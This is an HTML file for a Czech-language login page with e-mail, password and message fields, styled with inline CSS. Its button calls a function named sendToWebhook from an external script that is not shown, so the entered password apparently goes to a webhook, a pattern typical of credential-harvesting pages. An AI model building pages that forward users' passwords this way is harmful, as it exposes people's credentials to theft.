<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Přihlášení</title>
    <script src="script.js"></script>
</head>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f9;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .form-container {
        background-color: #ffffff;
        padding: 20px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        width: 300px;
    }

    .form-container h2 {
        margin-bottom: 20px;
        color: #333;
        text-align: center;
    }

    .form-container label {
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
        color: #555;
    }

    .form-container input {
        width: 100%;
        padding: 10px;
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 16px;
    }

    .form-container button {
        width: 100%;
        padding: 10px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
    }

    .form-container button:hover {
        background-color: #0056b3;
    }
</style>

<body>
    <div class="form-container">
        <h2>Přihlášení</h2>
        <form id="loginForm">
            <label for="email">E-mail:</label>
            <input type="email" id="email" name="email" placeholder="Zadejte svůj e-mail" required>

            <label for="password">Heslo:</label>
            <input type="password" id="password" name="password" placeholder="Zadejte své heslo" required>

            <label for="message">Zpráva:</label>
            <input type="text" id="message" name="message" placeholder="Zadejte svou zprávu" required>

            <button type="button" onClick="sendToWebhook(event)">Přihlásit se</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
